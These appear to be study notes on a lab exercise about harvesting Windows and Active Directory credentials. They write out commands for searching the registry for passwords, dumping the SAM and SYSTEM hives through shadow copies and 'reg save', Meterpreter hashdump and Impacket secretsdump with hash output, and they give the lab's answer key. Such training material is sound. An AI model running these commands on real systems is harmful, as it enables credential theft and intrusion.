Task1 - Introduction
-------------------------------------

The these modules we will check out how to obtain credentials to perform lateral movement and access resources in the AD environment. 

We will be gathering:
* Login Information
* Account Names
* Passwords

Some of the ways we will explore:
* Clear Text Files
* Obsfucated Files (base64 encoded etc)
* Registry
* Memory Dumps
* Network sniffing

__Questions__

I have completed room prerequisites and am ready to learn about Credentials Harvesting!
Answer: _None needed_


Task2 - Credential Harvesting
-----------------------------------------------

As the term of the title implies, this refers to gathering information and credentials we need to increase our access on the systems. Looking for stored credentials.

Credentials can be found in a variety of different forms, such as:

-   Accounts details (usernames and passwords)
-   Hashes that include NTLM hashes, etc.
-   Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)  
-   Any information that helps login into a system (private keys, etc.)


There are generally 2 types of credential harvesting. Internal and External. If we want to go external we can look in Social Media sites, Git repos, but also phishing campaigns. 

Here we will focus on the Internal method, where we already have a set of initial credentials to gain an intial foot-hold in the system.

__Questions__

I am ready to get started!
Answer: _None needed_

Task3 - Credential Access
------------------------------------------

__Credential Access__

This is where we can find credentials in compromised systems. It is always preferable to find credentials rather than resorting to things like CVEs or exploits because the later can break the systems and/or raise alarms.

Credentials can be in the following locations or others:
-   Clear-text files
-  Obfuscated or encrypted files
-   Database files
-   Memory
-   Password managers
-   Enterprise Vaults
-   Active Directory
-   Network Sniffing

__Clear-text Files__

Clear-text files might contain sensative information like passwords, private keys etc. The MITRE ATT&CK framework defines it as **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).

For example, suppose we wanted to look through PowerShell commands to see if someone left a $Password in there from a typical password change. We could look in:
`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

If you wanted to search the Windows registery for Password then you could use this:
```shell-session
c:\Users\user> reg query HKLM /f password /t REG_SZ /s 

#OR 

C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```


__Database Files__

Applications use Database files to read and write settings and yes credentials too. Many times Databases in Windows systems are stored locally. 

__Password Managers__

A password manager is a 3rd party tool to save passwords and make it easier for users to remember only a single login password to basically copy/paste or click-to-place their password into an app or site. 

Some examples:
* Built-in password managers (Windows)
* Third-Party: KeePass, 1Password, LastPass

Misconfigurations or security flaws and bugs can leave these open to attack.

__Memory Dump__

The operating systems' memory can contain a treasure trove of information like un-encrypted data/passwords. Since this data gets loaded when the program is executed.

Some examples of data in memory:
* Clear-text passwords
* Cached passwords
* AD tickets

__Active Directory__

AD stores a lot of information on users, groups and machines etc. This is typically a primary focus by advarsaries and red-teams.

These are some common mis-configs which can lead to information leaks:

-   **Users' description**: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. 
-   **Group Policy SYSVOL**: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.
-   **NTDS:** Contains AD users' credentials, making it a target for attackers.
-   **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

__Network Sniffing__

If we can gain sufficient access to target network for sniffing, then we can do things like man-in-the-middle attacks. This can reveal passwords, or let us create rogue or spoofed resources to steal credentials and NTLM hashes.

So we can search for the first flag using the reg.exe located in C:\Windows\system32 directory:

```shell-session
c:\Users\user> reg query HKLM /f flag /t REG_SZ /s
```

Then we can see the flag:
![[creds-harvest-1.png]]

For the next question we can use powershell to enumerate AD:
```shell-session
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

Then we can see the THM Victim with SamAccountName 'victim':
![[cred-harvest2.png]]

__Questions__

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Answer: _tyh4ckm3_

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Answer: _Passw0rd!@#_

Task4 - Local Windows Credentials
------------------------------------------------------

Generally speaking there are 2 types of Windows credentials: domain and local.

__Keystrokes__

Using a keylogger such as in Metasploit is another valuable way to get passwords. If we know a target user is logged in we can setup a keylogger and wait for them to login.

__Security Account Manager (SAM)__

The SAM is the local Microsoft Windows database that stores users and passwords. This DB is encrypted and also it may not be accessed while Windows is running. That said, there are ways to attack it.

The SAM is here:
`C:\Windows\System32\config\sam`

First we can see if we can read it or copy it:
`type C:\Windows\System32\config\sam`
and
`copy C:\Windows\System32\config\sam C:\Users\Administrator\Desktop\

![[cred-harvest3.png]]

__Metasploit's HashDump__

One of the easy ways to dump the hashes is using the built-in hashdump feature in Metasploit. This tool uses in-memory code injection to the LSASS.exe process to dump hashes.

```shell-session
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
[...]
hash
```

__Volume Shadow Copy Service__

In this method we use the Microsoft Volume Shadow copy service while in operation. Here are the steps:

1.  Run the standard cmd.exe prompt with administrator privileges.
2.  Execute the wmic command to create a copy shadow of C: drive
3.  Verify the creation from step 2 is available.
4.  Copy the SAM database from the volume we created in step 2

The process looks like this:

![[cred-harvest4.png]]

Once that has completed, we can use vssadmin, Volume Shadow Copy Service Administrator CLI tool to list and confirm we have a shadow copy of the C: drive volume:

![[cred-harvest5.png]]

This shows we successfully created a Shadow Volume on the path:
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`

This file is encrypted with either RC4 or AES encryption.  We need the key which is stored in:
`c:\Windows\System32\Config\system`

Now let's copy both the sam and system files to our desktop:
```shell-session
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

10.10.123.235

Now get the files over to our Attackbox:
![[cred-harvest6.png]]

__Registery Hives__

The Windows registery is another possible way to dump the SAM database content. It does store some of the data from the SAM to be used for Windows Services. We can use the Reg.exe tool for saving. As before we need 2 files:

```shell-session
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's copy those over to the Attackbox too.
![[cred-harvest7.png]]

Now let's use Impackets tools: secretsdump.py to extract credentials:
```bash
root@ip-10-10-123-235:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /var/tmp/sam-reg -system /var/tmp/system-reg LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

If we compare these results to the NTLM hashes we get from Metasploit the results are different. The reason for this is that the other accounts belong to Active Directory. Of course none of those are stored in the local system. To decrypt those we need to dump the SECURITY file from the Windows file which contains the required files to decrypt AD accounts.

Now that we have NTLM credentials we can use hashcat on them or just use them for impersonation.


__Questions__

Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?
Answer: _98d3a787a80d08385cea7fb4aa2a4261_



